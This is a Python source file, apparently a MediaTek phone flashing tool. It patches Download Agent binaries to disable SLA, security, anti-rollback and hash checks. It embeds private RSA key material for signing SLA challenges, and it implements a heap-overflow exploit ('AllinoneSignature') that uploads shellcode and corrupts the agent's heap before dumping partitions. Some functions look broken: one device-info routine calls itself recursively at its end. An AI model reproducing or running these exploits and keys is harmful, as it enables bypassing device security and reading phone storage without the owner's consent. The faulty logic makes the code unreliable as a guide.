    except Exception as e:
        dbg("stock carbonara: boot_to hash failed: %s" % e)
        print(RED + "hash write failed" + RESET)
        return None

    print(GREEN + "OK" + RESET)
    # Return patched stock DA2 and its address for boot_to
    return patched_stock_da2, stock_da2_addr


def patch_da2(da2_code, da2_addr):
    # Patch DA2 binary to bypass SLA and security checks.
    analyzer = Thumb2Analyzer(bytearray(da2_code), da2_addr)
    patched = False

    # Patch SLA: find devc_get_sla_enabled_status, force return 0.
    sla_xref = analyzer.str_xref("devc_get_sla_enabled_status")
    if sla_xref is not None:
        bl1 = analyzer.next_bl_from_off(sla_xref)
        if bl1 is not None:
            bl2 = analyzer.next_bl_from_off(bl1 + 4)
            if bl2 is not None:
                target_va = analyzer.bl_target(bl2)
                if target_va is not None:
                    target_off = analyzer.va_to_off(target_va)
                    if target_off is not None:
                        patch_bytes(analyzer.data, target_off, FORCE_RETURN)
                        dbg("patched SLA at 0x%X" % target_off)
                        patched = True
    if not patched:
        dbg("SLA patch skipped (string not found)")

    # Patch security check in cmd_download.
    cmd_dl_xref = analyzer.str_xref("cmd_download")
    if cmd_dl_xref is not None:
        bl1 = analyzer.next_bl_from_off(cmd_dl_xref)
        if bl1 is not None:
            bl2 = analyzer.next_bl_from_off(bl1 + 4)
            if bl2 is not None:
                sec_fn_va = analyzer.bl_target(bl2)
                if sec_fn_va is not None:
                    sec_off = analyzer.va_to_off(sec_fn_va)
                    if sec_off is not None:
                        patch_bytes(analyzer.data, sec_off, b"\x23\x00")
                        dbg("patched security at 0x%X" % sec_off)

    # Patch anti-rollback error constant to 0.
    patch_u32(analyzer.data, DA_ANTI_ROLLBACK, 0)

    # Patch DA2 cmd loop error handling.
    patch_u32(analyzer.data, 0x4340F003, 0x300F003)

    return bytes(analyzer.data)


def patch_da1(da1_data, da1_addr, da2_code):
    # Rehash DA2 and update DA1 hash, disable hash mismatch check.
    hash_off = find_da1_hash_offset(da1_data)
    if hash_off is None:
        dbg("DA1 hash offset not found, skipping rehash")
        return da1_data

    hash_data = da1_data[hash_off:hash_off + 48]
    ht = get_hash_type(hash_data)
    if ht is None:
        dbg("unknown hash type, skipping rehash")
        return da1_data

    new_hash = compute_hash(ht, da2_code)
    dbg("DA1 rehash (%s) at 0x%X" % (ht, hash_off))
    result = bytearray(da1_data)
    result[hash_off:hash_off + len(new_hash)] = new_hash

    patch_u32(result, DA_HASH_MISMATCH, 0)

    return bytes(result)


def find_gpt_header(gpt):
    # Detect GPT header at any sector size, forward or backward (PGPT or SGPT).
    n = len(gpt)
    for sz in (512, 1024, 2048, 4096, 8192):
        if n >= sz + 8 and gpt[sz:sz + 8] == b"EFI PART":
            return sz, False  # PGPT
        if n >= sz + 8 and gpt[n - sz:n - sz + 8] == b"EFI PART":
            return sz, True  # SGPT
    return None


def find_system_partition(gpt):
    loc = find_gpt_header(gpt)
    if not loc:
        return None
    sz, is_sgpt = loc
    if is_sgpt:
        hdr_off = len(gpt) - sz
    else:
        hdr_off = sz
    hdr = gpt[hdr_off:]
    entries_lba = struct.unpack("<Q", hdr[72:80])[0]
    num_entries = struct.unpack("<I", hdr[0x50:0x54])[0]
    entry_size = struct.unpack("<I", hdr[0x54:0x58])[0]
    if entry_size == 0 or entry_size > 0x200:
        return None
    if is_sgpt:
        # SGPT entries are BEFORE the header.
        start = hdr_off - num_entries * entry_size
    else:
        start = entries_lba * sz
    pos = start
    found = []
    for _ in range(num_entries):
        if pos + entry_size > len(gpt) or pos < 0:
            break
        name_raw = gpt[pos + 56:pos + 56 + 72]
        name = name_raw.decode("utf-16-le", errors="ignore").rstrip("\x00")
        type_guid = gpt[pos:pos + 16]
        first_lba = struct.unpack("<Q", gpt[pos + 32:pos + 40])[0]
        last_lba = struct.unpack("<Q", gpt[pos + 40:pos + 48])[0]
        if type_guid != b"\x00" * 16 and name:
            found.append(name)
        if name.lower() in ("system", "super") and type_guid != b"\x00" * 16:
            size = (last_lba - first_lba + 1) * sz
            return (first_lba * sz, size, name.lower())
        pos += entry_size
    dbg("gpt entries: %s" % ", ".join(found[:10]))
    return None


def find_prop(data, key):
    needle = key.encode() + b"="
    idx = data.find(needle)
    if idx == -1:
        return None
    rest = data[idx + len(needle):]
    end = rest.find(b"\n")
    if end == -1:
        end = len(rest)
    return rest[:end].decode("utf-8", errors="ignore").strip()


LP_MAGIC = b"\x11\x4c\x50\x4d\x11\x4c\x50\x4d"  # \x11LPM\x11LPM


def find_super_system(super_data):
    return _find_super_part(super_data, ("system_a", "system"))


def find_super_system_ext(super_data):
    return _find_super_part(super_data, ("system_ext_a",))


def _find_super_part(super_data, targets):
    # Parse MTK LP metadata in super: magic b'0PLA', 52-byte partition entries,
    # 24-byte extent entries.
    block = 4096  # UFS block size; LP offsets are in sectors.
    for hdr_off in range(0, min(len(super_data) - 0x2000, 0x40000), block):
        if super_data[hdr_off:hdr_off + 4] != b"0PLA":
            continue
        major = struct.unpack_from("<H", super_data, hdr_off + 4)[0]
        if major != 10:
            continue
        part_off = hdr_off + 0x100
        parts = []
        off = part_off
        while off < hdr_off + 0x4000:
            raw = super_data[off:off + 36]
            name = raw.split(b"\x00")[0]
            if not name or not all(32 <= b < 127 for b in name):
                break
            attrs, fe, ne, gi = struct.unpack_from("<IIII", super_data, off + 36)
            parts.append((name.decode(), fe, ne, gi))
            off += 52
        if not parts:
            continue
        ext_off = off
        for name, fe, ne, gi in parts:
            if name.lower() in targets:
                e = ext_off + fe * 24
                if e + 24 > len(super_data):
                    continue
                ns, tt, td, ts = struct.unpack_from("<QIII", super_data, e)
                if tt == 0 and td:
                    return (td * block, ns * block)
    return None


PROP_KEYS = [
    "ro.build.version.security_patch",
    "ro.build.date",
    "ro.build.id",
    "ro.build.version.incremental",
    "ro.build.version.sdk",
    "ro.product.brand",
    "ro.build.version.release",
    "ro.product.model",
    "ro.product.device",
    "ro.product.name",
    "ro.hardware",
    "ro.build.display.id",
    "ro.board.platform",
    "ro.build.description",
]

# SLA key database (from SakuraEDL/mtkclient)
SLA_KEYS = {
    "tecno_infinix": {
        "d": "499890AEF768030B56AD8BF7355262A57643A8C3DF318647B72E0B72416D91D25882D0077FEBE9E8275E9F42C3F89FFF5E99E0163487461B7CC3E97C1CC4F4E2D587AB7D8DB80335AA8E3254F318AAC42136FF1043649918685A0F5CF5548318090C26D951A2B93F79FB0D9B5E1DB1C928091E1908A5DA7D3B9194A22B18B78C6EF88932EFB3D88DB8BA7117257063DE165FA8534D50C6B35F6F7C0AF5F4A96BB89756BB7AC94110E8D1B5868A5DAADF815FE8FA38960A039D681F319C7B7ED7A55649C2F2F75B26C27807AFED8BC4EF57619FF9DA152E337FE379E1B1B0020C1EF2ABDCE4A66AAF3802EE8AB105ACA6F3388EA4C20184E572778C8EB3D30B51",
        "n": "BA4C5178EE5477B7A30FC99F9FE78E7C011E58B5DC05832591AADEE0D26A2667738FFE851782016CAE7DB8DC1958C627BC60E3A96D46E225536DCC76CBFADFE6CA2CBE4BE982AB46CBB0F1C5CB2CB13D7BBAC96E467D76AF819DCA28FB90A03AF92DDC05B34506E24F02A049D73B8143A1CF4B081372D49F4BCA21DA9EE8A19679669C71C836FC5B8180BD98256BA2AE82B702DDC61EDFD9C47871D027297D6C72A984046081953D141656F0DC4BC4E2D4006147BE096D7E855AA7057460EAC7C57660F1F28BE278C38700BAC5EBADB39F6508CF2F1E4044421664A856623FFB2002C1204CED786D576E3DDAA7C185FD698B1185A98A03B875F0A93831270557",
        "e": "010001",
    },
    "generic_codesig": {
        "d": "00D57BCF5934CE1A035F4598B42DAD4BC8AE7577FB6D81FA232317E8EE7C4FBB33772EFE378DF7DFE5369BB9ACAB1008FA1CFBA737890012A883B372B15932335B689B46A32F1B383B75F0DE2E1B5B0B9F4E1C3E780C2AB0CD3671EB4E34F30BB4C630A60D168CA124810D0F91A1ACC8EFDCEE52D4762BB35813BCC93878E1D15B750561B78006B4C13A8F76B5F10C941E5776C21192357A9B9D7E02C0FC812D2B154671863DE97CE3ED07F90624A0CADD04079E145168A3558A64786820192F5B638354DA69520288B976296961C337FB18A90120F2B6B365C0E1A57CE4119AE8BC718E08FDA33F1F42AA1C91AED090EC6B5656A66C246F89FDE5FD41A76671",
        "n": "01C6B6A1DDF05E818E3DFE16101C5DF65939F352EAB8AACA91CB5BFEC15A1989DD7553343683BC30BB38E45F15BF17BCCAB16A41D695A4318F26504675FE83E92EE21C991C0FBA705395B4A34C331842D8A6F69846B58CC67306E3DE27B05666A6C4372E3FC0D92F314805EDD5B1CB7D25BF3CF9CA9C33C36D97B0B37DA8A44A7A1CA651679D8D680557740C7C1CA25D84BDD12136C2930432808F28265D1E33E667389E4806D865F3CC06329534F7A11861EB688545DCCCEF0B04E96735A08368FA31A1F3260073B31299B216192E620B8D1EA468925ADBD627C49EFC3623658F3CF8AD6D8556272E48FA7711E650287DA19196610F036B6C0D394E42C121D1",
        "e": "010001",
    },
    "generic_securerosig": {
        "d": "040AB412E994921780E7D3AC4E665B5018BAD2221D93A236FCD3D4245BB14EF5E715B687254BFC5D5C058FF5C33AF644E6B03748A6ABFDFAFF808265B9C12B42C2164826B3A8CD5D6B3295E025618AED68D33E02D75FB8C69FDE6753AF454EAA92F448961C5D11DFD8D2D5125E54C71DE5792EAD4B4AD2A47ED2F144C664A2EC2B5C527D4C4570162EBADF6FA6AA19D86C927257BDA4AC4B471AD94AC16C8A97E9201101EF268E35E66835FE9831F3D18495BA15B3FCD9089B4569F770896674173647EFED86F4570CE6118E48A7EDD6CE2A2ED72A2E6FD615A323708F0881443B6C6DEF3800B392385E060AAC6CE086DDBA9227027F80B0DFDF691A1ED8A601",
        "n": "041EDF18B2702830A0D1D6D2C0C9833C46D55636929ABC8CBF62D03A8E352697F536DDF250E6CA5F1153A9227FEA4F6C4A91CF118FD821ABA9020FFC6AA05D4C361177AA384ACEE201E1326D5A0E1D566E74DA51CD735841FB5638E03F4E9A5AC58D0123F8E057686541E424F83508D1CEADDE7A893F57B852ECFF27953F53030953859EA265C0C7155F6B730E902BC23FEB58077E8D439606B164635D5AA0C53657BF2143EEE86F06781573BED22DD3E792591A263F2357CC42AEF4B8DB585987A311A022C4442A4DFA1C4891D8ADA1B231A92096E16D9C718FB09DFC0A5B008BB8243BF32C537A6B19542E37311085197B6BE8DA54EE1D6BC28BA94E0079CB",
        "e": "010001",
    },
}


def sha256(data):
    return hashlib.sha256(data).digest()


def sign_challenge(key_name, challenge_data):
    """Sign a challenge using an SLA private key. Returns signature bytes."""
    if not HAS_CRYPTO:
        dbg("cryptography library not available")
        return None
    key = SLA_KEYS.get(key_name)
    if key is None:
        return None
    d = int(key["d"], 16)
    n = int(key["n"], 16)
    e = int(key["e"], 16)
    # Build RSA private key from (n, d, e)
    # Use p, q derivation from d and public exponent
    priv_numbers = rsa.RSAPrivateNumbers(
        p=0, q=0, dmp1=0, dmq1=0, iqmp=0,
        public_numbers=rsa.RSAPublicNumbers(e, n)
    )
    # We need to compute p and q from d, e, n - skip for now, use raw modular exponentiation
    msg_int = int.from_bytes(challenge_data, "big")
    sig_int = pow(msg_int, d, n)
    sig_bytes = sig_int.to_bytes((n.bit_length() + 7) // 8, "big")
    return sig_bytes


# =============================================================================
# AllinoneSignature Exploit (DA2 XML encoding heap overflow)
# =============================================================================
# Vulnerability: DA2's XML encoding function uses a fixed 512-byte buffer.
# Sending a malicious source_file with many XML entities (& → &amp; expansion)
# overflows the buffer, corrupting heap metadata and hijacking control flow.
#
# Flow (from SakuraEDL/Penumbra):
#   1. Upload shellcode via CMD:SECURITY-SET-ALLINONE-SIGNATURE
#   2. Trigger overflow with malicious source_file
#   3. Overflow corrupts heap → DPC callback hijack → shellcode execution
#   4. Shellcode disables security checks + re-registers commands
#
# NOTE: The shellcode (hakujoudai.bin) is DA-version specific and must be
# extracted from Penumbra or generated for your specific DA binary.
# =============================================================================

# Shellcode — loaded from payloads/hakujoudai.bin
_PAYLOADS_DIR = os.path.join(os.path.dirname(__file__), "..", "payloads")
_SHELLCODE_PATH = os.path.join(_PAYLOADS_DIR, "hakujoudai.bin")
if os.path.exists(_SHELLCODE_PATH):
    SHELLCODE = open(_SHELLCODE_PATH, "rb").read()
else:
    SHELLCODE = b"\x00\x20\x70\x47"
    dbg("WARNING: hakujoudai.bin not found at %s" % _SHELLCODE_PATH)

# Stock DAs for Carbonara exploit
_STOCK_V5_PATH = os.path.join(_PAYLOADS_DIR, "MTK_DA_V5.bin")
_STOCK_V6_PATH = os.path.join(_PAYLOADS_DIR, "MTK_DA_V6.bin")


def generate_malicious_source_file():
    """Generate a malicious source_file string that triggers the XML encoding overflow.

    The DA's XML encoding function expands special characters:
      & → &amp; (5 bytes per 1 byte)
      < → &lt; (4 bytes)
      > → &gt; (4 bytes)

    A source_file with ~5000 semicolons + XML entities will encode to >512 bytes,
    overflowing the fixed buffer at DA2+0x968B0.
    """
    # Pattern: semicolons + XML entities to maximize expansion
    parts = []
    entities = ["&amp;", "&gt;", "&lt;", "&quot;"]
    for i in range(1200):
        parts.append(";")
        if i % 4 == 0:
            parts.append(entities[i % len(entities)])
    return "".join(parts)


def allinone_exploit(xf, da2_data, da2_addr):
    """Execute AllinoneSignature heap overflow exploit.

    Steps:
    1. Wait for DA to be ready, drain any init data
    2. Upload shellcode via CMD:SECURITY-SET-ALLINONE-SIGNATURE
    3. Trigger overflow with malicious source_file
    4. DA2 heap corruption → control flow hijack → shellcode runs
    """
    # Step 0: Drain any init data from DA
    time.sleep(1)
    try:
        init = xf.s.read(256)
        if init:
            dbg("exploit: init data:", init.hex()[:64])
    except Exception:
        pass

    # Step 1: Upload shellcode
    dbg("exploit: uploading shellcode (%d bytes)" % len(SHELLCODE))
    xml1 = '<?xml version="1.0" encoding="UTF-8"?>'
    xml1 += '<da><version>1.0</version>'
    xml1 += '<command>CMD:SECURITY-SET-ALLINONE-SIGNATURE</command>'
    xml1 += '<arg><source_file>hakujoudai</source_file></arg>'
    xml1 += '</da>'

    # Send XML header + data separately (like SakuraEDL does)
    xml_bytes = xml1.encode("utf-8")
    hdr = struct.pack("<III", XF_MAGIC, 1, len(xml_bytes))
    dbg("exploit: TX header", hdr.hex())
    xf.s.write(hdr)
    time.sleep(0.1)
    dbg("exploit: TX xml", xml_bytes[:80])
    xf.s.write(xml_bytes)
    xf.s.flush()
    time.sleep(1)

    # Read response
    resp = xf.read_xml_response(5)
    dbg("exploit: shellcode upload resp:", resp)

    # If DA asks for DOWNLOAD-FILE, send shellcode
    if resp is not None:
        resp_bytes = resp if isinstance(resp, bytes) else b""
        if b"DOWNLOAD-FILE" in resp_bytes or b"OK" in resp_bytes:
            dbg("exploit: DA requested download, sending shellcode")
            # Send OK
            ok_hdr = struct.pack("<III", XF_MAGIC, 1, 2)
            xf.s.write(ok_hdr + b"OK")
            time.sleep(0.2)
            # Read next response
            resp2 = xf.read_xml_response(3)
            dbg("exploit: after OK:", resp2)
            # Send size
            size_str = "OK@%d " % len(SHELLCODE)
            size_bytes = size_str.encode()
            size_hdr = struct.pack("<III", XF_MAGIC, 1, len(size_bytes))
            xf.s.write(size_hdr + size_bytes)
            time.sleep(0.2)
            resp3 = xf.read_xml_response(3)
            dbg("exploit: after size:", resp3)
            # Send shellcode data
            data_hdr = struct.pack("<III", XF_MAGIC, 2, len(SHELLCODE))
            xf.s.write(data_hdr)
            xf.s.write(SHELLCODE)
            xf.s.flush()
            time.sleep(1)
            resp4 = xf.read_xml_response(5)
            dbg("exploit: after shellcode:", resp4)

    # Step 2: Trigger overflow with malicious source_file
    malicious_sf = generate_malicious_source_file()
    dbg("exploit: triggering overflow (source_file %d chars)" % len(malicious_sf))

    xml2 = '<?xml version="1.0" encoding="UTF-8"?>'
    xml2 += '<da><version>1.0</version>'
    xml2 += '<command>CMD:SECURITY-SET-ALLINONE-SIGNATURE</command>'
    xml2 += '<arg><source_file>%s</source_file></arg>' % malicious_sf
    xml2 += '</da>'
    xml2_bytes = xml2.encode("utf-8")
    hdr2 = struct.pack("<III", XF_MAGIC, 1, len(xml2_bytes))
    xf.s.write(hdr2 + xml2_bytes)
    xf.s.flush()
    time.sleep(1)

    # Read response — DA may return ERR (expected) or hang (exploit working)
    resp5 = xf.read_xml_response(3)
    dbg("exploit: overflow resp:", resp5)

    # Step 3: If exploit worked, DA should be unlocked.
    # Try a test read to verify.
    time.sleep(1)
    try:
        # Try reading PGPT to verify exploit worked
        test = xf.read_partition("PGPT")
        if test and len(test) > 0:
            dbg("exploit: PGPT read OK (%d bytes)" % len(test))
            return True
    except Exception as e:
        dbg("exploit: verification read failed:", e)

    return False


def main():
    global DEBUG
    if len(sys.argv) < 2:
        print("usage: mtk_test.py [--debug] [--rom|-r] [--wait|-w] [--meta] [--no-meta] <da.bin>")
        return
    DEBUG = "--debug" in sys.argv
    meta_mode = "--meta" in sys.argv
    no_meta = "--no-meta" in sys.argv
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    if not args:
        print("usage: mtk_test.py [--debug] [--rom|-r] [--wait|-w] [--meta] [--no-meta] <da.bin>")
        return
    da_path = args[0]
    wait = "--wait" in sys.argv or "-w" in sys.argv
    rom_only = "--rom" in sys.argv or "-r" in sys.argv

    s, port_name, mode = search_and_open(wait, rom_only=rom_only)
    if not s:
        return
    dbg("found %s (%s)" % (port_name, mode))

    pl = Pl(s)
    pl.handshake()
    hw = pl.get_hw_code()
    sub, hwv, swv = pl.get_hw_sw_ver()
    dbg("hw=0x%04X sub=0x%04X hwv=0x%04X swv=0x%04X" % (hw, sub, hwv, swv))

    dacode = dacode_for(hw)
    data = open(da_path, "rb").read()
    entries = parse_da(data)
    entry = [e for e in entries if e[0] == dacode and e[1] == sub] or \
            [e for e in entries if e[0] == dacode]
    if not entry:
        print("no DA entry for dacode 0x%04X" % dacode)
        s.close()
        return
    regions = entry[0][2]
    da1 = regions[1] if len(regions) != 2 else regions[0]
    da2 = regions[2] if len(regions) != 2 else regions[1]

    da1_off, da1_len, da1_addr, _, da1_sig = da1
    da1_data = data[da1_off:da1_off + da1_len]
    dbg("DA1 %d bytes @ 0x%08X sig 0x%X" % (len(da1_data), da1_addr, da1_sig))

    da2_off, da2_len, da2_addr, _, da2_sig = da2
    da2_data = data[da2_off:da2_off + da2_len - da2_sig]
    dbg("DA2 %d bytes @ 0x%08X" % (len(da2_data), da2_addr))

    pl.send_da(da1_addr, da1_data, da1_sig)
    pl.jump_da(da1_addr)

    xf = Xf(s)
    xf.da1_sync()
    xf.get_packet_length()

    # Try mtkclient full library first (Carbonara + HeapBait + SLA).
    print("Trying mtkclient exploits...", end=" ", flush=True)
    mtkclient_ok = try_mtkclient_exploit(port_name, da_path, hw)
    if mtkclient_ok:
        print("Device unlocked. Reconnecting...")
        time.sleep(2)
        s_new, _, _ = search_and_open(True, timeout=15, rom_only=False)
        if s_new:
            s = s_new
            xf = Xf(s)
            try:
                xf.da1_sync()
                xf.get_packet_length()
            except Exception:
                pass
    else:
        # mtkclient failed. Try our custom Carbonara + stock DA.
        print("Trying custom Carbonara...")
        patched_da2 = None
        stock_patched_da2 = None
        stock_da2_addr = None

        if carbonara_is_vulnerable(da1_data):
            hash_off = carbonara_find_hash_offset(da1_data, da1_sig)
            if hash_off is not None:
                hash_type = carbonara_get_hash_type(da1_data, hash_off)
                hash_addr = da1_addr + hash_off
                patched_da2 = patch_da2(da2_data, da2_addr)
                new_hash = compute_hash(hash_type, patched_da2[:len(patched_da2) - da2_sig])
                try:
                    xf.boot_to(hash_addr, new_hash)
                    print("  vendor hash written")
                except Exception as e:
                    dbg("vendor hash write failed:", e)
                    patched_da2 = None

        if patched_da2 is None:
            stock_path = _STOCK_V5_PATH if os.path.exists(_STOCK_V5_PATH) else _STOCK_V6_PATH
            if os.path.exists(stock_path):
                stock_data = open(stock_path, "rb").read()
                if stock_data[:18] == b'MTK_DOWNLOAD_AGENT':
                    ver = int.from_bytes(stock_data[96:100], 'little')
                    count = int.from_bytes(stock_data[104:108], 'little')
                    esize = 0xDC if ver == 4 else 0xD8
                    pos = 0x6C
                    for i in range(count):
                        hw_e = int.from_bytes(stock_data[pos+2:pos+4], 'little')
                        if hw_e in (0x0813, 0x0989, 0x6833):
                            roff = pos + 20 if ver == 4 else pos + 16
                            sd2_off, sd2_len, sd2_addr, _, sd2_sig = struct.unpack('<IIIII', stock_data[roff+40:roff+60])
                            sd1_off, sd1_len, sd1_addr, _, sd1_sig = struct.unpack('<IIIII', stock_data[roff+20:roff+40])
                            stock_da1 = stock_data[sd1_off:sd1_off+sd1_len]
                            stock_da2_raw = stock_data[sd2_off:sd2_off+sd2_len]
                            if carbonara_is_vulnerable(stock_da1):
                                hash_off_s = carbonara_find_hash_offset(stock_da1, sd1_sig)
                                if hash_off_s is not None:
                                    hash_type_s = carbonara_get_hash_type(stock_da1, hash_off_s)
                                    stock_patched_da2 = patch_da2(stock_da2_raw[:sd2_len - sd2_sig], sd2_addr)
                                    hash_s = compute_hash(hash_type_s, stock_patched_da2)
                                    try:
                                        xf.boot_to(sd1_addr + hash_off_s, hash_s)
                                        stock_da2_addr = sd2_addr
                                        print("  stock hash written")
                                    except Exception as e:
                                        dbg("stock hash write failed:", e)
                                        stock_patched_da2 = None
                            break
                        pos += esize

    print("Sending Download Agent for informations...", end=" ", flush=True)
    if stock_patched_da2 is not None:
        da2_data = stock_patched_da2
        da2_addr = stock_da2_addr
    elif patched_da2 is not None:
        da2_data = patched_da2
    else:
        if da2_sig == 0:
            patched_vendor = patch_da2(da2_data, da2_addr)
            if patched_vendor != da2_data:
                da2_data = patched_vendor

    try:
        xf.boot_to(da2_addr, da2_data)
        time.sleep(3)
        xf.post_da2_init()
        print(GREEN + "OK" + RESET)
    except Exception as e:
        dbg("DA2 boot failed:", e)
        print(RED + "Failed" + RESET)
        s.close()
        return

    try:
        st = xf.detect_storage()
        if isinstance(st, tuple):
            st, ufs_info = st
        else:
            ufs_info = None
    except Exception as e:
        dbg("storage detect failed:", e)
        s.close()
        time.sleep(2)
        s2, port_name2, mode2 = search_and_open(True, timeout=30, rom_only=rom_only)
        if not s2:
            print(RED + "DA device not found after re-enum" + RESET)
            return
        dbg("re-enumerated %s (%s)" % (port_name2, mode2))
        s = s2
        xf = Xf(s)
        time.sleep(1)
        xf.post_da2_init()
        try:
            st = xf.detect_storage()
            if isinstance(st, tuple):
                st, ufs_info = st
            else:
                ufs_info = None
        except Exception as e2:
            dbg("re-enum storage detect failed:", e2)
            print("Reading partition information... " + RED + "Failed" + RESET)

    # Try DA2 XML auth: AllinoneSignature exploit (heap overflow in XML encoding).
    # The DA's XML encoding function uses a fixed 512-byte buffer. By sending a
    # malicious source_file with many XML entities, we overflow the buffer and
    # corrupt heap metadata to hijack control flow.
    print("AllinoneSignature exploit...", end=" ", flush=True)

    # DA may re-enumerate after boot — re-scan for COM port.
    time.sleep(2)
    s.close()
    time.sleep(1)
    dbg("exploit: re-scanning for DA port...")
    s_new, _, _ = search_and_open(True, timeout=15, rom_only=False)
    if s_new:
        s = s_new
        xf = Xf(s)
        dbg("exploit: reconnected to DA port")
    else:
        dbg("exploit: DA port not found, trying original port")
        try:
            s = serial.Serial(port_name, 921600, timeout=10)
            xf = Xf(s)
        except Exception:
            pass

    try:
        exploit_ok = allinone_exploit(xf, da2_data, da2_addr)
        if exploit_ok:
            print(GREEN + "OK" + RESET)
        else:
            print(RED + "failed" + RESET)
    except Exception as e:
        dbg("exploit exception:", e)
        print(RED + "failed" + RESET)

    # Device info is read via DA protocol (read_partition), NOT meta mode.
    # Meta mode is a separate path for Transsion-specific operations (commands 25-27).
    print("Reading partition information...", end=" ", flush=True)
    try:
        _read_device_info(s, xf, hw, st, ufs_info)
    except Exception as e:
        dbg("partition read failed:", e)
        print(RED + "Failed" + RESET)

    s.close()


def _read_device_info(s, xf, hw, st, ufs_info):
    """Read device info by parsing super partition LP metadata for system."""
    user_off = 0
    if ufs_info is not None:
        user_off = xf.get_ufs_user_offset(ufs_info)
    dbg("user_off=0x%X st=0x%X" % (user_off, st))

    try:
        cat = xf.devctrl(0x040009)
        dbg("partition table cat: %s" % cat.hex()[:8])
    except Exception as e:
        dbg("GetPartitionTblCata err:", e)

    # Read GPT.
    gpt = None
    for name in ("PGPT", "SGPT"):
        try:
            probe = xf.read_partition(name)
            dbg("part %s %d bytes first16 %s" % (name, len(probe), probe[:16].hex()))
            if find_gpt_header(probe):
                gpt = probe
                break
        except Exception as e:
            dbg("part %s err %s" % (name, e))
    if gpt is None:
        try:
            gpt = xf.read_flash(user_off, 0x200000, st)
        except Exception as e:
            dbg("GPT read failed:", e)
            raise Exception("cannot read GPT")

    part_count = 0
    loc = find_gpt_header(gpt)
    if loc:
        sz, is_sgpt = loc
        if is_sgpt:
            hdr_off = len(gpt) - sz
        else:
            hdr_off = sz
        part_count = struct.unpack("<I", gpt[hdr_off + 0x50:hdr_off + 0x54])[0]
    dbg("part_count=%d" % part_count)
    open("gpt_dump.bin", "wb").write(gpt)
    print(GREEN + "OK" + RESET)

    print("Reading system information...", end=" ", flush=True)
    props = {}

    # 1) Try DA read_partition by name (some DAs resolve logical partitions).
    sys_data = None
    for pname in ("system", "system_a", "system_ext_a"):
        try:
            pd = xf.read_partition(pname)
            dbg("read_partition(%s) %d bytes first16 %s" % (pname, len(pd), pd[:16].hex()))
            if any(find_prop(pd, k) for k in PROP_KEYS):
                sys_data = pd
                break
        except Exception as e:
            dbg("read_partition(%s) err: %s" % (pname, e))

    # 2) Read super from GPT, parse LP metadata for system extent.
    if sys_data is None:
        sys_part = find_system_partition(gpt)
        if sys_part:
            addr, size, name = sys_part
            dbg("found %s @ 0x%X (%d MB)" % (name, addr, size // (1024 * 1024)))
            if name == "super":
                try:
                    super_data = xf.read_flash(user_off + addr, min(size, 0x400000), st)
                    open("super_dump.bin", "wb").write(super_data)
                    dbg("super dump %d bytes" % len(super_data))
                    sys_extent = find_super_system(super_data)
                    if sys_extent:
                        saddr, ssize = sys_extent
                        scan_len = min(ssize, 64 * 1024 * 1024)
                        dbg("system extent @ 0x%X (%d MB)" % (saddr, ssize // (1024 * 1024)))
                        sys_data = xf.read_flash(addr + saddr, scan_len, st)
                except Exception as e:
                    dbg("super read failed:", e)
            else:
                scan_len = min(size, 64 * 1024 * 1024)
                try:
                    sys_data = xf.read_flash(addr, scan_len, st)
                except Exception as e:
                    dbg("system read failed:", e)
        else:
            dbg("no system/super in GPT")

    # 3) Fallback: try scatter-known super offset.
    if sys_data is None:
        super_off = 0x4B800000
        dbg("trying scatter super @ 0x%X" % super_off)
        try:
            super_data = xf.read_flash(user_off + super_off, 0x400000, st)
            open("super_dump.bin", "wb").write(super_data)
            sys_extent = find_super_system(super_data)
            if sys_extent:
                saddr, ssize = sys_extent
                scan_len = min(ssize, 64 * 1024 * 1024)
                sys_data = xf.read_flash(super_off + saddr, scan_len, st)
        except Exception as e:
            dbg("scatter super read failed:", e)

    if sys_data:
        open("system_dump.bin", "wb").write(sys_data)
        dbg("system dump %d bytes saved" % len(sys_data))
        for key in PROP_KEYS:
            val = find_prop(sys_data, key)
            if val:
                props[key] = val
        print(GREEN + "OK" + RESET)
    else:
        print(RED + "Failed" + RESET)

    # If meta failed or skipped, read device info from system partition via DA.
    print("Reading partition information...", end=" ", flush=True)
    try:
        _read_device_info(s, xf, hw, st, ufs_info)
    except Exception as e:
        dbg("partition read failed:", e)
        print(RED + "Failed" + RESET)

    s.close()


# =============================================================================
# Transsion Meta mode (0x7E framing, AT+SHELL="getprop ...")
# =============================================================================
META_FRAME = 0x7E
META_CODE_AT = 0x68


class TranssionMeta:
    def __init__(self, s):
        self.s = s

    def _send_frame(self, code, payload):
        length = len(payload) + 8
        hdr = struct.pack("<BxIHH", META_FRAME, 0, length, code)
        frame = hdr + payload + b"\x7E"
        dbg("META TX", frame.hex()[:80])
        self.s.write(frame)

    def _read_frame(self):
        # Scan for 0x7E start marker.
        while True:
            b = read_exact(self.s, 1)
            if b[0] == META_FRAME:
                break
        _field = read_exact(self.s, 4)
        length = struct.unpack("<H", read_exact(self.s, 2))[0]
        code = struct.unpack("<H", read_exact(self.s, 2))[0]
        payload_len = length - 8
        payload = b""
        if payload_len > 0:
            payload = read_exact(self.s, payload_len)
        trail = read_exact(self.s, 1)
        if trail[0] != META_FRAME:
            dbg("META bad trail 0x%02X" % trail[0])
        dbg("META RX code=0x%04X len=%d payload=%s" % (code, len(payload), payload[:64].hex()))
        return code, payload

    def send_at(self, cmd):
        data = cmd.encode("ascii") + b"\x00"
        self._send_frame(META_CODE_AT, data)
        code, payload = self._read_frame()
        return payload

    def getprop(self, prop):
        resp = self.send_at('AT+SHELL="getprop %s"' % prop)
        # Response has prop=value, parse after ':'.
        text = resp.decode("ascii", errors="ignore").strip("\x00")
        if ":" in text:
            return text.split(":", 1)[1].strip()
        return text.strip()

    def read_info(self):
        props = {}
        for key in PROP_KEYS:
            try:
                val = self.getprop(key)
                if val:
                    props[key] = val
                dbg("getprop %s = %s" % (key, val))
            except Exception as e:
                dbg("getprop %s err: %s" % (key, e))
        return props

    def reboot(self):
        try:
            self.send_at("AT+SHELL=reboot")
        except Exception:
            pass


def enter_meta_brom(pl):
    # Try entering meta mode via BROM echo-framed command.
    # Command 0xD6 = meta mode entry on many MTK SoCs.
    try:
        pl.echo(b"\xD6")
        time.sleep(0.5)
        return True
    except Exception:
        return False


def meta_info(s, pl, hw):
    print("Entering Transsion Meta mode...", end=" ", flush=True)
    meta = TranssionMeta(s)

    # Try sending a ping AT command to check if already in meta mode.
    try:
        resp = meta.send_at("AT")
        if b"OK" in resp or len(resp) > 0:
            print(GREEN + "OK" + RESET)
            print("Reading system information...", end=" ", flush=True)
            props = meta.read_info()
            print(GREEN + "OK" + RESET)
            _print_props(props, hw)
            return True
